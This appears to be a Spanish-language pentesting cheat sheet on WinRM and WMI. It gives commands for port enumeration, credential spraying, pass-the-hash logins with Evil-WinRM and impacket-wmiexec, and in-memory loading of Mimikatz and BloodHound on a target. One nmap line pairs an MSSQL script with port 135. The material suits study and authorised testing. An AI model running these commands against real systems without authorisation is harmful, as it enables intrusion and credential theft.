---
title: WinRM & WMI (Administración Remota de Windows - Puertos 135, 5985, 5986)
pubDate: '2026-08-26'
---

## ¿Qué es WinRM y WMI?
* **WinRM (Windows Remote Management - Puertos 5985 HTTP / 5986 HTTPS):** Protocolo estándar de Microsoft basado en SOAP/WS-Management para la administración y ejecución de sesiones PowerShell remotas.
* **WMI (Windows Management Instrumentation - Puerto 135 RPC / DCOM):** Interfaz crítica para la administración integral de sistemas Windows que permite consultar y modificar configuraciones, procesos y servicios.

### Riesgos principales
1. **Shell Interactiva:** Miembros del grupo local *Remote Management Users* o *Administrators* obtienen acceso directo a consola.
2. **Autenticación Pass-the-Hash (PtH):** Permite autenticarse directamente con el hash NTLM sin requerir la contraseña en texto plano.
3. **Persistencia y Movimiento Lateral:** Vectores legítimos de administración que evitan generar alertas de malware de terceros.

---

## 🔎 1. Enumeración y Scripts Nmap

```bash
# Escaneo de puertos WinRM
nmap -sV -sC <TARGET_IP> -p5985,5986 --disable-arp-ping -n

# Escaneo de WMI / RPC (Puerto 135)
nmap -p 135 --script=ms-sql-ntlm-info,rpcinfo <TARGET_IP>

# Validación de Credenciales con NetExec / CrackMapExec
nxc winrm <TARGET_IP> -u 'usuario' -p 'password'
nxc winrm <TARGET_IP> -u 'usuario' -H <HASH_NTLM>
crackmapexec winrm <TARGET_IP> -u users.txt -p passwords.txt
```

---

## 🚀 2. Obtención de Shell con Evil-WinRM

**Evil-WinRM** es la herramienta líder para interactuar con WinRM desde Linux:

```bash
# Conexión estándar
evil-winrm -i <TARGET_IP> -u 'usuario' -p 'password'

# Conexión segura SSL (Puerto 5986)
evil-winrm -i <TARGET_IP> -u 'usuario' -p 'password' -S

# Conexión mediante Pass-the-Hash
evil-winrm -i <TARGET_IP> -u 'usuario' -H <HASH_NTLM>
```

### Funciones Avanzadas dentro de Evil-WinRM:
* `upload /ruta/local /ruta/remota`: Subida directa de binarios y scripts.
* `download /ruta/remota`: Descarga de archivos hacia la máquina local.
* `menu`: Menú dinámico para cargar scripts de PowerShell (Mimikatz, BloodHound, PowerView) directamente en la memoria del objetivo sin tocar disco (*in-memory execution*).
* `services`: Lista y estado de todos los servicios locales.

---

## ⚡ 3. Ejecución Remota con WMI (`wmiexec.py`)

Si el puerto 5985/5986 está cerrado pero el puerto 135 (RPC/SMB) está abierto, **WMI** es el método más sigiloso para ejecutar comandos remotos:

```bash
# Ejecución interactiva de comandos
impacket-wmiexec DOMINIO/usuario:'password'@<TARGET_IP>
impacket-wmiexec usuario@<TARGET_IP> -hashes :<HASH_NTLM>

# Ejecución puntual de un comando (ej. hostname o whoami)
/usr/share/doc/python3-impacket/examples/wmiexec.py usuario:"P455w0rD!"@<TARGET_IP> "hostname"
```
